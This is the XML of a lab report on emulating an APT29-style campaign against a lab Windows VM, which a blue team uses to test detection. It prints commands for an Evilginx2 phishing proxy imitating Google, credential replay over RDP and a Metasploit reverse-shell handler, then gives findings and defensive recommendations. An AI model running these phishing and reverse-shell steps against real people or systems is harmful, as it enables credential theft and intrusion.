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F63E" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Task 3 — Adversary Emulation Lab (Full Report)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310967B0" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Author: MALEPATI SAMSKAR REDDY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50DBA97F" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Date: September 19, 2025</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16024FD2" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Attacker: Kali Linux — 192.168.17.128</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BCE73B" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Target(s): Windows VM — 192.168.17.129; Cloud test accounts as applicable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FFA842" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E6E67C" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D24FC49" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Emulate a realistic adversary (e.g., APT29-like) by simulating phishing, credential harvesting, lateral movement, persistence, and data access to validate blue team detection and response capabilities. Focus on repeatable playbooks using Caldera and automation where possible.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EEF632B" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Lab Environment &amp; Tools</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BC62FA" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Environment:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="062E027E" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Attacker: Kali Linux — 192.168.17.128</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E223E04" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Target: Windows VM — 192.168.17.129 (with Wazuh for detection)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B1F9AA" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Simulated cloud/test accounts for credential replay (optional)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C3E346" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Tools:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F2B949" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Caldera (MITRE) for automated adversary emulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBB22F3" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Evilginx2 for credential harvesting and phishing proxy simulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4538A0AA" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Metasploit for exploitation and session handling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2878722D" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Cobalt Strike / PoshC2 as C2 frameworks for persistence and post-exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC0E8B6" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Wazuh / Splunk for detection and telemetry collection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16AC6915" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Step-by-Step Methodology (with reconstructed commands)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F4811BC" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>This workflow reproduces an APT-style campaign from phishing to persistence using automation and manual steps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ADD4199" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>A. Prepare phishing infrastructure (Evilginx2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="552A5E6D" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Example commands / actions:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55755F40" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:br/>
        <w:t># Install/configure Evilginx2 (example)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>git clone https://github.com/kgretzky/evilginx2.git</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>cd evilginx2</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Configure site and credential capture</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># In evilginx2 console:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>phishctl domain add example.phish</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>phishctl site enable google</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Start the proxy</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>sudo ./bin/evilginx --serve</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D40A6C" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>B. Launch automated emulation (Caldera)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA0817C" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Example Caldera workflow:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0794715B" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t># Start Caldera server</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>git clone https://github.com/mitre/caldera.git --recursive</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>cd caldera</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>python3 server.py --insecure</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Use UI or API to create an operation for APT29-like profile</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Example API call to create operation (pseudo):</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>curl -X POST http://localhost:8888/api/v2/operations -d '{"name":"APT29-emulation","adversary":"APT29","agents":["agent1"]}'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="64CD548C" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>C. Credential harvesting &amp; initial access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34316A4F" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Actions and reconstructed commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C81E4E" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t># Phishing link distribution (simulated)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Captured credentials via Evilginx2 stored in logs, then used to authenticate to target services</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Example: replay credentials to RDP/SMB or to cloud console</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>rdesktop 192.168.17.129 -u 'victim' -p 'captured_password'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="263F8CB9" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>D. Post-exploitation via automated playbooks (Caldera + Metasploit)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F066EBE" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Example actions:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D3718C" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:br/>
        <w:t># Use Caldera to run persistence and lateral movement abilities</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Launch Metasploit handler for payloads if needed</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.17.128; set LPORT 443; run"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB7F1E3" w14:textId="1907404F" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4. Observed Evidence </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0527E5" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot 2025-09-16 210356.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD84E8A" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot 2025-09-17 154916.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4849CF83" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 19-54-26.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52AAA417" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 21-03-49.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7765D57A" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 21-04-37.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18BBA255" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 21-05-44.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714F57D7" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-16 21-12-11.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE9BF75" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 13-53-15.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216291CB" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 13-57-01.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7FEB9E" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 15-24-05.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F7EE232" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 15-25-30.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B84AD2" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 15-25-39.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661B05AC" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 15-33-38.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B577D8" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 15-53-50.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC36394" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 15-56-37.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCFCA88" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 15-58-43.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D998BDE" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Screenshot From 2025-09-17 16-11-57.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56976990" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Reconstructed Attack Flow &amp; Timeline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B98FB5" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t>- Recon &amp; Preparation: Build phishing pages and Caldera operation defining the adversary profile.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>- Initial Access: Distribute phishing link via simulated channels; Evilginx2 captures credentials.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Credential Use: Use harvested credentials to access target services and pivot to internal hosts.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Persistence: Deploy C2 implants (PoshC2/Cobalt) or use Metasploit payloads; establish beacons.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Lateral Movement: Use stolen creds + native tools (RDP, WMI, SMB) to move laterally.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Data Access/Exfiltration: Identify sensitive files and stage exfiltration via cloud or direct S3 copy.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Clean Up: Emulation may include artifact cleanup to test detection scope (optional in labs).</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECAD6CA" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Findings &amp; Risk Assessment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369EDA86" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Automated emulation successfully reproduced multi-stage APT-like behavior, including phishing, credential theft, and C2 deployment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07322A0A" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Blue team detection points: authentication anomalies, unusual PowerShell/script execution, Caldera agent communications, and metadata mismatches.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A836F91" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Gaps observed: delayed correlation between cloud logs and host telemetry; inadequate detection of transparent proxy-based credential harvesting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5BCE6B" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Risk Rating: High — Emulation shows viable paths for persistent access and data compromise if in production.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500A8FF3" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. MITRE ATT&amp;CK Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40413625" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1566.001 — Phishing: Spearphishing Link</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C6ED41" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1588 — Obtain Capabilities (Evilginx2 for credential capture)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A8898DA" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1078 — Valid Accounts (use of captured credentials)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="355CAC8D" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1136 — Create Account (if persistence includes backdoor account creation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F547065" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1059 / T1059.001 — Command and Scripting Interpreter: PowerShell (execution)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25689DFF" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- T1071 — Application Layer Protocol (C2 beaconing)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3982082B" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8. Recommendations (technical &amp; operational)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C802CDE" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Technical controls:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C4612EB" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Deploy phishing-resistant MFA (FIDO or hardware tokens) and enforce MFA for all sensitive actions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5750AC25" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Enable detailed authentication telemetry and anomalous login detection (geo/IP anomalies, impossible travel).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE8DB23" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>- Monitor for reverse proxy fingerprints and unusual SNI patterns that may indicate Evilginx-style proxying.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C2BA36F" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Harden endpoints: script block logging, AMSI, and process monitoring to detect post-exploitation activity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5129AB5F" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Operational controls:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A03161" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Run regular adversary emulation exercises and red/blue drills to test detection and response playbooks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A93363A" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Improve log ingestion and correlation between cloud and endpoint telemetry; run table-top exercises with SOC teams.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C93F655" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Maintain an incident playbook that includes credential compromise procedures (rotate keys, revoke sessions, reset passwords).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635DFB9C" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. Forensic Artifacts to Collect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278A7C9F" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Evilginx2 logs of captured credentials and session tokens.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DB974A" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Caldera operation logs and agent telemetry for timeline reconstruction.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314795DA" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Endpoint logs (Sysmon, PowerShell script block logs, process creation).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="224C86DE" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Network captures to analyze phishing redirects and TLS sessions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDEAEBD" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>- Cloud auth logs and session tokens to trace replayed credential use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E27C6D" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10. 50-Word Summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCC2D80" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Emulated an APT-style campaign using Evilginx2 and Caldera to automate phishing, credential harvesting, and post-exploitation actions. Harvested credentials were replayed to access target services, deploy C2 implants, and move laterally. Recommended phishing-resistant MFA, improved telemetry correlation, and regular red/blue exercises.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FFA616A" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>11. Appendix: Reconstructed Commands &amp; Examples</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5377F826" w14:textId="77777777" w:rsidR="00EC6B73" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t># Evilginx2 (example)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>git clone https://github.com/kgretzky/evilginx2.git</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>cd evilginx2</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Configure and enable phishing site (follow Evilginx2 docs)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>sudo ./bin/evilginx --serve</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Caldera (example)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>git clone https://github.com/mitre/caldera.git --recursive</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>cd caldera</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>python3 server.py --insecure</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Create operation via API/UI for automated emulation</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># Metasploit handler for post-exploitation payloads</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.17.128; set LPORT 443; run"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00EC6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640400">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1786121397">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="786658030">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="182791792">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="493569920">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="218591249">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="545527790">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="758866612">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="17183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9C7"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="007935F6"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AB607C"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CD7696"/>
    <w:rsid w:val="00EC6B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C3974"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{B616A3A3-AD39-426B-95B6-9FBCC3B5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6</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-19T10:31:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>